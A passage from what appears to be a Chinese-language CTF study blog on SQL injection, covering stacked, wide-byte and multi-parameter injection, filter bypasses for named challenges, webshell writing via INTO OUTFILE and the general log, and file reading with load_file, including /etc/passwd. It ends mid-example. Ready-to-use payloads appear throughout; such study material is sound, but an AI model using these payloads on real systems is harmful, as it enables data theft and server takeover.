<p>但是并不推荐后者，因为往往像username这样的字符型，都会带有单引号，从而双引号不能够起作用，我这里演示的是没有闭合方式的。</p>
<p>那么接下来就是常规的联合注入的过程了。这里需要注意，有可能一二两次查询的不是一个表，也就是字段数可能不同，所以还需要重新进行字段数判断。一般利用payload如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,payload,3,4 from users # payload 都需要经过16进制编码</span><br></pre></td></tr></table></figure></p>
<h2 id="堆叠注入">3.5. 堆叠注入</h2>
<h3 id="原理-1">3.5.1. 原理</h3>
<p>原理：分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。 [[#1 8 一次执行多条sql语句]]</p>
<p><strong>原理其实很简单，难点在于查询字段信息时必须要用到 select，而一般考察堆叠注入的题目都会将select过滤掉。这其实对我们是有好处的，以后如果碰到SQL注入的题目过滤了select，并且无法绕过，可以直接考虑堆叠注入。</strong></p>
<h3 id="利用">3.5.2. 利用</h3>
<h4 id="预编译-1">3.5.2.1. 预编译</h4>
<p>如果被过滤了select导致无法查看字段信息，此时可以使用该办法（前提是预编译的关键词没被过滤）</p>
<p>原理：[[#1 9 预编译]]</p>
<p>以[[强网杯 2019 随便注]]与[[攻防世界_supersqli]]（两者是一道题）的payload为例： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);prEpare stmt from @sql;EXECUTE stmt;#</span><br><span class="line"></span><br><span class="line">转为如下代码：</span><br><span class="line">sEt @sql = CONCAT(&#x27;se&#x27;,&#x27;lect * from `1919810931114514`;&#x27;);</span><br><span class="line">prEpare stmt from @sql;</span><br><span class="line">EXECUTE stmt;</span><br></pre></td></tr></table></figure></p>
<p>利用concat拼接字符串得到select，然后使用预编译就可以不用再输入select，从而实现了绕过。</p>
<h4 id="改表名">3.5.2.2. 改表名</h4>
<p>这个的使用条件略微有点苛刻：</p>
<ol type="1">
<li>关键词alter、rename不能被过滤；</li>
<li>需要的信息不在当前表内；</li>
<li>后台有默认查询的表；</li>
</ol>
<p>题目和[[#预编译]]一样。在该题目中，如果我们输入<code>1' or 1=1</code>，那么就会把words表中的所有信息都显示出来，然后flag在另一个表中。</p>
<p>假设一个表为table1，另一个表为table2，table1中有一个字段为id，table2中有一个字段为flag，默认查询的是table1,后台语句为<code>select * from table1 where id='输入'</code>。此时可以：</p>
<ol type="1">
<li>table1改名为anyTable；</li>
<li>table2改名为table1；</li>
<li>table1.flag改名为table1.id</li>
</ol>
<p>那么只要where后面为1，就会直接执行<code>select * from table1</code>从而得到flag。</p>
<h4 id="handlermysql专属">3.5.2.3. handler(mysql专属)</h4>
<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">语法结构：</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ] </span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>
<p>如： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">handler tableName open [as alias];  #指定数据表进行载入并将返回句柄重命名</span><br><span class="line">handler tableName/alias read first; #读取指定表/句柄的首行数据</span><br><span class="line">handler tableName/alias read next;  #读取指定表/句柄的下一行数据</span><br><span class="line">handler tableName/alias read next;  #读取指定表/句柄的下一行数据</span><br><span class="line">...</span><br><span class="line">handler tableName/alias close;      #关闭句柄</span><br></pre></td></tr></table></figure></p>
<p>当上面两个办法所使用的关键词都被过滤的时候，可以选择使用该办法来读取字段信息。</p>
<p>题目：[[GYCTF2020 Blacklist]]。最终读取flag的payload为：(可以不加反引号) <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;handler `FlagHere` open;handler `FlagHere` read first;--+</span><br></pre></td></tr></table></figure></p>
<h2 id="宽字节注入">3.6. 宽字节注入</h2>
<h3 id="认识addslashes函数">3.6.1. 认识addslashes函数</h3>
<p><strong>定义和用法：</strong> &gt; addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。 &gt; 预定义符号：单引号（'），双引号（"），反斜杠（），NULL。</p>
<p><strong>例子：</strong> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where id = 1&#x27;;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line"><span class="keyword">echo</span> PHP_EOL; <span class="comment"># 换行</span></span><br><span class="line"><span class="keyword">echo</span> addslashes(<span class="variable">$sql</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>得到如下结果： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select id = 1&#x27;from users;</span><br><span class="line">select id = 1\&#x27; from users;</span><br></pre></td></tr></table></figure></p>
<p>对于简单的字符型、数字型注入，经该函数转义的sql语句确实会“卡死“单引号。（构造攻击的sql语句不会执行）</p>
<p>此时的难点就是<strong>如何让我们输入的单引号绕过该函数，从而使构造的sql执行</strong>。</p>
<h3 id="原理-2">3.6.2. 原理</h3>
<p>宽字节注入利用了mysql一个特性，<strong>即当mysql在使用GBK编码的时候，会认为两个字符是一个汉字</strong>。（前一个ASCII码<strong>要大于128</strong>，才到汉字的范围）</p>
<p>首先需要了解一些特殊字符的url编码（ascii码中的字符用 % + 16进制）： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空格  %20</span><br><span class="line">&#x27;     %27</span><br><span class="line">#     %23</span><br><span class="line">\     %5c</span><br></pre></td></tr></table></figure></p>
<p>当输入单引号时，经过addslashes会得到<code>\'</code>，url编码为<code>%5C%27</code>。如果我们输入为<code>%df'</code>，（在单引号前面添加一个ASCII码大于128的字符）经该函数后得到<code>%df%5c%27</code>，如果使用的GBK编码的话，<code>%df%5c</code>会被当作一个汉字处理，最后的结果为<code>運'</code>，此时前两个字节结合，后一个字节单独，而后一个字节正好时单引号，单引号逃出限制！</p>
<h2 id="推测后端语句">3.7. 推测后端语句</h2>
<p>玄学！！！[[SUCTF 2019 EasySQL]]，本题是堆叠注入，不过需要对后端语句进行猜测。</p>
<p><strong>在本题中，只有当我们输入非零数字时，才会有回显1，其他都不回显</strong>。因此猜测后端语句为： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sql</span> <span class="operator">=</span> <span class="keyword">select</span> $query <span class="operator">||</span> columnName <span class="keyword">from</span> tableName;</span><br></pre></td></tr></table></figure></p>
<p>因此如果我们输入0或者其他字符<code>select 0||columnName from tableName</code>，因为字段名一般不以数字开头，所以‘或’的结果一定是0。这里没有显示（其实是会显示的，本地测验结果如下）可能有一个函数：如果返回值为0则不显示吧。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426223232.png" /></p>
<p>接下来就很简单了，我们需要<code>select column1, column2 from table_name</code>是可以显示多条columns的信息的，这里也使用这个,构造<code>select *,1||columnName from tableName</code>就会回显<code>*</code>和<code>1||columnName</code>的结果。(1改为0也可以)</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span>, <span class="number">1</span> <span class="operator">||</span> username <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+---------------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span> camp   <span class="operator">|</span> <span class="number">1</span> <span class="operator">||</span> username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+---------------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span> admin    <span class="operator">|</span> admin  <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> root     <span class="operator">|</span> root     <span class="operator">|</span> root   <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> hdf      <span class="operator">|</span> hdf      <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> xioazz   <span class="operator">|</span> xiozz    <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span> you      <span class="operator">|</span> you      <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">6</span> <span class="operator">|</span> run      <span class="operator">|</span> run      <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+---------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span>, <span class="number">0</span> <span class="operator">||</span> username <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+---------------+</span></span><br><span class="line"><span class="operator">|</span> id   <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span> camp   <span class="operator">|</span> <span class="number">0</span> <span class="operator">||</span> username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+---------------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span> admin    <span class="operator">|</span> admin    <span class="operator">|</span> admin  <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span> root     <span class="operator">|</span> root     <span class="operator">|</span> root   <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span> hdf      <span class="operator">|</span> hdf      <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">4</span> <span class="operator">|</span> xioazz   <span class="operator">|</span> xiozz    <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">5</span> <span class="operator">|</span> you      <span class="operator">|</span> you      <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">6</span> <span class="operator">|</span> run      <span class="operator">|</span> run      <span class="operator">|</span> common <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+----------+----------+--------+---------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">6</span> warnings (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>select不用在乎字段数</p>
</blockquote>
<h3 id="进阶">3.7.1. || 进阶</h3>
<p>命令:<code>set sql_mode=pipes_as_concat</code>会使 '||'失去‘或’的作用，而变成字符串连接符。因此当我们输入在数据库中输入查询语句<code>select 1||column_name from table_name</code>时，会显示： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> sql_mode<span class="operator">=</span>pipes_as_concat;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.01</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="number">1</span><span class="operator">||</span>username <span class="keyword">from</span> users;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span><span class="operator">||</span>username <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>admin      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>root       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>hdf        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>xioazz     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>you        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span>run        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------+</span></span><br><span class="line"><span class="number">6</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>显示的值为1和username的值拼接之后的结果。因此，本题中可以构造这样的payload： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query=1;set sql_mode=pipes_as_concat;select 1(任意数字)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426223917.png" /></p>
<p>这样会查找两次，第一次查找<code>select 1</code>，第二次查找<code>select 1||flag from Flag</code>，中间做了设置，使'||'作用变为字符串连接符。因此得到两次结果：</p>
<h2 id="update-inset-into注入">3.8. update, inset into注入</h2>
<p>这两个注入都是不回显的。update的作用是更改信息；而insert into的作用是插入新的数据。</p>
<p>这里需要提一下update的一个特点：<strong>update可以将同一个表内的一个字段的值赋值给另一个字段</strong>。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=column_name4,... where column_name3=value;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318210614.png" /></p>
<p>上述语句会将字段4的值赋给字段2。</p>
<h2 id="多参数注入">3.9. 多参数注入</h2>
<p>没有遇到过实际题目，在这里说明一下原理。</p>
<p>假设后台语句如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span>&quot;</span>;</span><br></pre></td></tr></table></figure></p>
<p>其中 $uname 和 $passwd 为用户输入。假如我们输入如下payload: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?uname=1union/*&amp;passwd=*/select * from users</span><br></pre></td></tr></table></figure></p>
<p>那么最终的后台语句为： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=1 union/* and password = */select * from users&quot;</span>;</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=1 union select * from users&quot;</span>;</span><br><span class="line"></span><br><span class="line">结果：</span><br><span class="line">+------+----------+----------+--------+</span><br><span class="line">| id   | username | password | camp   |</span><br><span class="line">+------+----------+----------+--------+</span><br><span class="line">|    <span class="number">1</span> | admin    | admin    | admin  |</span><br><span class="line">|    <span class="number">2</span> | root     | root     | root   |</span><br><span class="line">|    <span class="number">3</span> | hdf      | hdf      | common |</span><br><span class="line">|    <span class="number">4</span> | xioazz   | xiozz    | common |</span><br><span class="line">|    <span class="number">5</span> | you      | you      | common |</span><br><span class="line">|    <span class="number">6</span> | run      | run      | common |</span><br><span class="line">+------+----------+----------+--------+</span><br></pre></td></tr></table></figure></p>
<h2 id="利用mysql写入文件">3.10. 利用MySQL写入文件</h2>
<h3 id="select-..-into-outfileinto-dumpfile">3.10.1. select .. into outfile/into dumpfile</h3>
<p>语法如下： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seleect content <span class="keyword">into</span> outfile <span class="string">&#x27;filePath&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>测试 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">into</span> outfile <span class="string">&#x27;D:\\test.txt&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">6</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427103611.png" /></p>
<p>成功将数据导入，因此，可以这么利用： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &#x27;&lt;?php phpinfo();?&gt;&#x27;from users into outfile &#x27;D:\\shell.txt&#x27;;</span><br><span class="line">Query OK, 6 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427103735.png" /></p>
<p>只需要把中间的内容改成一句话即可。（dumpfile也是一样的语法）</p>
<h3 id="secure_file_priv">3.10.2. secure_file_priv</h3>
<p>有时候，在写入时可能会报错，<code>ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</code></p>
<p>这是因为MySQL中的secure_file_priv的值会对读写文件造成一定的影响。可以利用下面的命令来查看： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;secure_file_priv&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br><span class="line"><span class="operator">|</span> secure_file_priv <span class="operator">|</span> <span class="keyword">NULL</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------+</span></span><br></pre></td></tr></table></figure></p>
<p>说明：</p>
<ol type="1">
<li>当值为 NULL 时，表示MySQL不允许导入/导出</li>
<li>当值为某一具体路径时，表示MySQL只能够导入到特定路径；</li>
<li>当没有值时，则说明没有任何限制；</li>
</ol>
<p>而这个变量的值无法通过命令进行修改，只能够修改MySQL的配置文件mysql.ini。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427104643.png" /></p>
<p>直接修改值即可。（如果没有这个变量，就自己添加这么一行）</p>
<h3 id="利用日志写入">3.10.3. 利用日志写入</h3>
<p>当secure_file_priv的值为NULL时，可以利用日志进行shell写入。</p>
<p>首席查看log的位置， <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;general_log%&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name    <span class="operator">|</span> <span class="keyword">Value</span>                                     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> general_log      <span class="operator">|</span> OFF                                       <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> general_log_file <span class="operator">|</span> D:\phpStudy2018\PHPTutorial\MySQL\data\HF <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+-------------------------------------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span>, <span class="number">1</span> warning (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>使用log写入shell的方式：</p>
<ol type="1">
<li>开启日志记录：set global general_log='on';</li>
<li>将日志文件导出到指定目录：set global general_log_file='filePath';</li>
<li>最后执行select语句，例如：select '<?php phpinfo();?>';</li>
</ol>
<p>测试： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected, <span class="number">1</span> warning (<span class="number">0.03</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;D://shelltest.php&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;</span>?php phpinfo();?<span class="operator">&gt;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="operator">&lt;</span>?php phpinfo();?<span class="operator">&gt;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>查看你对应的文件：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427105208.png" /></p>
<p>成功写入。</p>
<h2 id="利用mysql读取文件">3.11. 利用MySQL读取文件</h2>
<h3 id="load_file">3.11.1. load_file()</h3>
<p>语法： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;filePath&#x27;</span>);</span><br></pre></td></tr></table></figure></p>
<p>防止文件中有非法字符，可以先将其编码： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> hex(load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>));</span><br></pre></td></tr></table></figure></p>
<p>测试： <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> load_file(<span class="string">&#x27;D://test.txt&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="operator">|</span> load_file(<span class="string">&#x27;D://test.txt&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="operator">|</span> hello world               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> hex(load_file(<span 